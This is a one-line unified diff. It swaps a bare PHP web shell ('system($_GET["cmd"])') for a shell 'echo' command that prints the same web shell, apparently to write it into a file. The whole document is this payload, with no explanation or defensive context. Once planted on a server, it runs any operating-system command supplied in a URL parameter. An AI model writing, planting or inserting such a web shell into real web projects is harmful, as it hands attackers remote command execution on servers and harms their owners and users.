@@ -1,1 +1,1 @@
-<?php system($_GET["cmd"]) ?>
+echo '<?php system($_GET["cmd"]) ?>'
